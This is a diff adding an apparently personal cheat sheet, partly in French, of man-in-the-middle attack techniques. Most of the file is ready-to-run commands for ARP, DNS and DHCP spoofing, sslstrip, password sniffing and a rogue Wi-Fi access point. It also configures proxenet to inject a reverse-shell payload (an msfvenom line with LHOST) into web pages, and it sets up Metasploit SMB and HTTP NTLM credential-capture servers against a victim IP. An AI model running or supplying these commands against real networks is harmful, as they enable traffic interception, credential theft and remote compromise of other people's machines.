@@ -1,0 +1,210 @@
+# mitm
+
+# tools
+bettercap (https://github.com/evilsocket/bettercap-proxy-modules)
+pyersinia (https://github.com/nottinghamprisateam/pyersinia) based off yersinia
+mallory
+marvin (http://www.gremwell.com/marvin-mitm-tapping-dot1x-links)
+apimonitor (http://www.rohitab.com/apimonitor)
+echomirage (http://www.wildcroftsecurity.com/echo-mirage was:http://www.bindshell.net/tools/echomirage.html)
+pfi (https://github.com/s7ephen/pfi.git)
+tcpprox (https://github.com/iSECPartners/tcpprox) "TCP proxy utility written in Python"
+canape (http://www.contextis.com/research/tools/canape/) "capture and modify traffic, specifically designed for binary protocols"
+trudy https://www.praetorian.com/blog/trudy-a-dead-simple-tcp-intercepting-proxy-mitm-vm
+NetRipper (https://github.com/NytroRST/NetRipper ) "Windows API hooking"
+Trudy https://github.com/praetorian-inc/trudy
+
+# anti arp spoof
+http://arpon.sourceforge.net/
+
+# linking 2 laptops
+* setting up
+iwconfig wlan0 channel 3
+iwconfig wlan0 enc on
+iwconfig wlan0 key 1234-1234-12
+iwconfig wlan0 essid hsc
+ifconfig wlan0 2.3.2.1 netmask 255.0.0.0 up
+iptables -I INPUT 1 -i wlan0 -m mac --mac-source ! 00:11:22:33:44:55 -j DROP
+iptables -i INPUT -i wlan0 -p tcp --dport ssh -s 2.3.2.20 -j ACCEPT
+iptables -P INPUT DROP
+* accessing
+iwconfig: idem
+ifconfig wlan0 hw ether 00:11:22:33:44:55 
+ifconfig wlan0 2.3.2.20 netmask 255.0.0.0 up
+
+# superfish / komodia
+https://blog.filippo.io/komodia-superfish-ssl-validation-is-broken/
+
+#### webmitm avec ARP poisoning
+openssl genrsa -out example.key 1024
+openssl req -new -key example.key -out example.csr
+openssl x509 -req -days 365 -in example.csr -signkey example.key -out example.crt
+
+cat > /etc/hosts-to-spoof <<'EOF'
+192.168.0.31 www.example.com
+192.168.0.31 *.google.*
+EOF
+
+dnsspoof -f /etc/hosts-to-spoof dst port udp 53 # uniquement en ARP poisoning
+iptables -I FORWARD 1 -p udp --dport 53 -m string --hex-string '|01 00 00 01 00 00 00 00 00 00 03 77 77 77 06 67 6f 6f 67 6c 65 03 63 6f 6d 00 00 01 00 01|' -j DROP # ne pas forwarder toute query A pour www.example.com
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# broadcast ARP replies to all hosts, saying that the IP of the gw maps to my MAC address
+arpspoof IP_gw
+# ou mieux: unicast ARP replies to only victim and gateway
+arpspoof -t victim gw
+arpspoof -t gw victim
+
+# Va ecouter sur :80 et :443 et se base sur Host: ou URL complète pour rediriger (sauf si argument host).
+# Va servir le meme certificat SSL serveur.
+# Il faut des \r\n dans la requete (marchera pas avec des \n).
+webmitm -ddd
+
+#### mitm avec DNS poisoning
+# csrf pour mettre une resolution statique www.google.fr 192.168.0.31
+
+#ou dhcp spoof -> je suis nameserver
+# dnsmasq - Permet de forwarder. Permet pas de faire *.google.*
+dnsmasq -k -q -8 /tmp/dnsmasq.log -A '/google.fr/google.com/192.168.0.31'
+
+#sniff avec Wireshark (trafic en clair uniquement)
+iptables -t nat -I PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.0.32.10 # IP du site web usurpé
+iptables -t nat -I POSTROUTING -j MASQUERADE
+et lancer un wireshark
+
+#sniff avec Burp 
+iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8082
+iptables -t nat -I PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8082 # generation auto de cert avec CN=w.x.y ne marche pas
+
+#sniff avec Squid
+iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 3128  # squid.conf: http_port 3128 accel vhost 
+iptables -t nat -I PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 3129 # squid.conf: https_port 3129 vhost cert=wildcard.pem # mais avertissement de secu probable
+
+#sslstrip
+iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 1337
+$ sslstrip -f -a -l 1337 -w /tmp/sslstrip.log # pas en root
+
+#sniff de mdp
+dsnif -n
+ettercap -Tzq
+
+urlsnarf | cut -d\" -f2
+tshark -ln -i eth0 -R http -V| sedhttp
+
+#### mitm avec DHCP et DNS poisoning (half-duplex: on ne voit pas les reponses)
+#avec dnsmasq
+echo 1 > /proc/sys/net/ipv4/ip_forward
+dnsmasq -k -q -8 /tmp/dnsmasq.log --dhcp-range=192.168.0.10,192.168.0.50,255.255.255.0,24h --dhcp-option=option:dns-server,8.8.8.8 # je suis le routeur
+# et meme manip sslstrip pour le ssl 
+arpspoof -t 192.168.0.254 192.168.0.20 # pour voir les reponses (ie. reponses HTTP, images ...)
+
+#avec ettercap
+ettercap -Tzq -M dhcp:/255.255.255.0/8.8.8.8
+
+# mitm iphone
+cat hostapd.conf 
+interface=wlan0
+driver=nl80211
+ssid=hsc
+channel=11
+hw_mode=g
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=2
+wpa_passphrase=blahblah
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+rsn_pairwise=TKIP
+
+hostapd ./hostapd.conf
+
+ip addr add 192.168.8.1/24 dev wlan0
+echo 1 > /proc/sys/net/ipv4/ip_forward
+route add default gw ... #optional
+
+$IP4 -A FORWARD -i wlan0 -j ACCEPT
+$IP4 -A FORWARD -o wlan0 -d 192.168.8.0/24 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+
+iptables -t nat -I PREROUTING -p tcp -s 192.168.8.46 --dport 80 -j REDIRECT --to-ports 8082
+iptables -t nat -I PREROUTING -p tcp -s 192.168.8.46 --dport 443 -j REDIRECT --to-ports 8082
+iptables -t nat -A POSTROUTING -s 192.168.8.0/24 -j MASQUERADE
+
+dnsmasq --bind-interfaces --listen-address 192.168.8.1 -k -q -8 /tmp/dnsmasq.log --dhcp-range 192.168.8.10,192.168.8.50,255.255.255.0,24h --dhcp-option option:dns-server,192.168.8.1 --dhcp-option option:router,192.168.8.1 -p 54 -R -C /dev/null
+or just dns:
+dnsmasq --bind-interfaces --listen-address 192.168.8.1 -k -q -8 /tmp/dnsmasq.log -p 53 -C /dev/null
+
+# wifi mitm to try out
+http://www.reddit.com/r/netsec/comments/1hcnz7/python_mitm_tool_targeting_script_for_local/
+https://github.com/hatRiot/zarp
+
+# redir *
+iptables -A OUTPUT -p ICMP -j DROP
+iptables -t nat -A PREROUTING -p udp --dst 192.168.10.21 --dport 53 -j DNAT --to-destination 192.168.12.38:53
+iptables -t nat -A PREROUTING -p udp --dst 192.168.10.21 --dport 88 -j DNAT --to-destination 192.168.12.38:88
+iptables -t nat -A PREROUTING -p tcp --dst 192.168.10.21 --dport 445 -j DNAT --to-destination 192.168.12.38:445
+iptables -t nat -A PREROUTING -p tcp --dst 192.168.10.21 --dport 389 -j DNAT --to-destination 192.168.12.38:389
+iptables -t nat -A PREROUTING -p tcp --dst 192.168.10.21 --dport 139 -j DNAT --to-destination 192.168.12.38:139
+
+# proxenet inject html + capture smb
+MYIP=192.168.122.99
+VICTIMIP=192.168.122.141
+GWIP=192.168.122.1
+
+cat > ~/.proxenet.ini <<EOF
+[oPhishPoison]
+; This should point to the payload to be inserted as the HTTP response.
+; For example:
+; msfvenom -p windows/shell_reverse_tcp -f raw -b '\x0d\x0a\x00\xff' -o mypayload LHOST=192.168.56.1 LPORT=4444
+msfpayload   = %(home)s/tmp/my_payload
+
+; Point to Python binary
+python       = /usr/bin/python2.7
+
+; Download https://gist.github.com/hugsy/18aa43255fd4d905a379#file-xor-payload-py
+; and copy its path to this configuration script.
+xor_payload  = %(home)s/code/xor-payload/xor-payload.py
+
+; This should point to the HTML page to inject every time a user fetches
+; any HTML page
+html_inject_stub = %(home)s/injected_page.html
+EOF
+echo whatever > ~/injected_page.html
+
+modify payload in inject_this() with $MYIP
+
+sed -e 's,^Port 8080,Port 3129,' /etc/tinyproxy.conf
+service tinyproxy restart
+
+./proxenet -b $MYIP -p 8008 -N -X 127.0.0.1 -P 3129
+
+iptables -t nat -I PREROUTING -i eth0 -p tcp ! -s $MYIP --dport 80 -j REDIRECT --to-port 8008
+iptables -t nat -I PREROUTING -i eth0 -p tcp ! -s $MYIP --dport 445 -j REDIRECT --to-port 445
+iptables -t nat -A POSTROUTING -s 192.168.122.0/24 -j MASQUERADE
+
+cat > msf-capture.rc <<EOF
+set ConsoleLogging true
+set LogLevel 5
+set SessionLogging true
+set TimestampOutput true
+set PROMPT %T S:%S J:%J
+
+use auxiliary/server/capture/smb
+set SRVHOST $MYIP
+set JOHNPWFILE /root/capture-smb
+exploit -j -z
+
+use auxiliary/server/capture/http_ntlm
+set SRVHOST $MYIP
+set SRVPORT 8080
+set URIPATH /
+set JOHNPWFILE /root/capture-http-ntlm
+exploit -j -z
+EOF
+msfconsole -r msf-capture.rc
+
+arpspoof -t victim gw
+arpspoof -t gw victim
+
+
